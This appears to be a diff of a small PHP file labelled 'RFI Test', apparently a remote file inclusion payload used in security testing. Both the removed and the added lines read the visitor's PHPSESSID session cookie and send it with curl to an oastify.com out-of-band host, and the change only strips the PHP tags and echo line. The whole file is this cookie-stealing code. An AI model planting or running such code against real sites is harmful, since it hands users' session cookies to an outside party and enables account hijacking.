@@ -1,8 +1,5 @@
-<?php
-    echo "RFI Test";
-    $url = "http://89fm4azpt1ttzqy9f0ked1bxdojf75vu.oastify.com/?cookie=".$_COOKIE["PHPSESSID"];
-    $curl = curl_init($url);
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-    $response = curl_exec($curl);
-    curl_close($curl);
-?>
+$url = "http://89fm4azpt1ttzqy9f0ked1bxdojf75vu.oastify.com/?cookie=".$_COOKIE["PHPSESSID"];
+$curl = curl_init($url);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($curl);
+curl_close($curl);
